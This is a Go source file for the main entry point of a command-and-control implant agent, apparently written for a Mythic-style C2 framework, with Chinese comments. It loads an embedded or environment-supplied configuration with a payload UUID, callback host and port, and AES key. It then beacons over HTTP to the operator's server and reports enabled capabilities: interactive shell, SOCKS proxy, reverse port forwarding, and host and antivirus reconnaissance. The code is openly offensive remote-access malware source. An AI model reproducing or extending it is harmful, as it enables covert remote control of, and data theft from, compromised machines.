package main

import (
	"log"
	"os"
	"strings"
	"time"
)

var BuildPayloadUUID = ""
var BuildCallbackHost = ""
var BuildCallbackPort = ""
var BuildAESPSK = ""
var BuildInsecureSkipVerify = ""

var taskPollWait = 5 * time.Second

var processSupervisor *sessionSupervisor

func main() {
	applyRuntimeOverrides()

	config, err := loadEmbeddedConfig()
	if err != nil {
		log.Printf("加载嵌入配置失败: %v\n", err)
		return
	}
	if override := parseEnvPollInterval(); override > 0 {
		config.PollIntervalSeconds = override
	}
	runtimeConfig = config.Capabilities
	taskPollWait = time.Duration(config.PollIntervalSeconds) * time.Second

	if strings.TrimSpace(config.PayloadUUID) == "" {
		log.Println("缺少 payload_uuid")
		return
	}
	httpProfile, ok := config.Profiles["http"]
	if !ok || strings.TrimSpace(httpProfile.CallbackHost) == "" {
		log.Println("缺少 http profile 配置")
		return
	}

	beaconTransport, err := newHTTPTransport(httpProfile, config.InsecureSkipVerify)
	if err != nil {
		log.Printf("初始化 beacon HTTP 传输失败: %v\n", err)
		return
	}

	processSupervisor = newSessionSupervisor(config)
	beaconController, err := newAgentController(CallbackRoleBeacon, config, httpProfile, beaconTransport, "")
	if err != nil {
		log.Printf("初始化 beacon controller 失败: %v\n", err)
		return
	}

	log.Printf("my_agent 启动: payload_uuid=%s beacon=%s:%s\n", config.PayloadUUID, httpProfile.CallbackHost, httpProfile.CallbackPort)
	if websocketProfile, exists := config.Profiles["websocket"]; exists {
		log.Printf("session 配置: enabled=%t websocket=%s:%s\n", config.EnableSessionMode, websocketProfile.CallbackHost, websocketProfile.CallbackPort)
	} else {
		log.Printf("session 配置: enabled=%t websocket=未配置\n", config.EnableSessionMode)
	}
	log.Printf("轮询间隔: %ds\n", config.PollIntervalSeconds)
	// 这些能力标志正式构建时由 UI 中勾选的命令列表推导；
	// 本地 run_agent_local 时仍允许通过环境变量覆盖，便于单独调试。
	log.Printf("命令能力: interactive=%t socks=%t rpfwd=%t shell=%s tls_skip_verify=%t\n",
		runtimeConfig.InteractiveEnabled,
		runtimeConfig.SocksEnabled,
		runtimeConfig.RpfwdEnabled,
		runtimeConfig.InteractiveShell,
		config.InsecureSkipVerify,
	)
	log.Printf("已包含的信息收集命令: sysinfo=%t ps=%t avscan=%t\n",
		runtimeConfig.SysinfoEnabled,
		runtimeConfig.ProcessListEnabled,
		runtimeConfig.AVScanEnabled,
	)

	beaconController.Run()
}

func applyRuntimeOverrides() {
	// 这些环境变量仅用于本地源码调试兜底。
	// 正式构建时统一以嵌入配置为准，命令能力来自 payload 的命令勾选。
	if BuildEmbeddedConfigB64 == "" {
		BuildEmbeddedConfigB64 = strings.TrimSpace(os.Getenv("MY_AGENT_EMBEDDED_CONFIG_B64"))
	}
	if BuildPayloadUUID == "" {
		BuildPayloadUUID = strings.TrimSpace(os.Getenv("MY_AGENT_PAYLOAD_UUID"))
	}
	if BuildCallbackHost == "" {
		BuildCallbackHost = strings.TrimSpace(os.Getenv("MY_AGENT_CALLBACK_HOST"))
	}
	if BuildCallbackPort == "" {
		BuildCallbackPort = strings.TrimSpace(os.Getenv("MY_AGENT_CALLBACK_PORT"))
	}
	if BuildAESPSK == "" {
		BuildAESPSK = strings.TrimSpace(os.Getenv("MY_AGENT_AESPSK"))
	}
	if BuildInsecureSkipVerify == "" {
		BuildInsecureSkipVerify = strings.TrimSpace(os.Getenv("MY_AGENT_INSECURE_SKIP_VERIFY"))
	}
	if BuildInteractiveShell == "" {
		BuildInteractiveShell = strings.TrimSpace(os.Getenv("MY_AGENT_INTERACTIVE_SHELL"))
	}
	if BuildEnableSessionMode == "" {
		BuildEnableSessionMode = strings.TrimSpace(os.Getenv("MY_AGENT_ENABLE_SESSION_MODE"))
	}
	if BuildWebsocketCallbackHost == "" {
		BuildWebsocketCallbackHost = strings.TrimSpace(os.Getenv("MY_AGENT_WS_CALLBACK_HOST"))
	}
	if BuildWebsocketCallbackPort == "" {
		BuildWebsocketCallbackPort = strings.TrimSpace(os.Getenv("MY_AGENT_WS_CALLBACK_PORT"))
	}
	if BuildWebsocketAESPSK == "" {
		BuildWebsocketAESPSK = strings.TrimSpace(os.Getenv("MY_AGENT_WS_AESPSK"))
	}
}

func parseEnvPollInterval() int {
	value := strings.TrimSpace(os.Getenv("MY_AGENT_POLL_INTERVAL_SECONDS"))
	if value == "" {
		return 0
	}
	return parsePollIntervalValue(value)
}
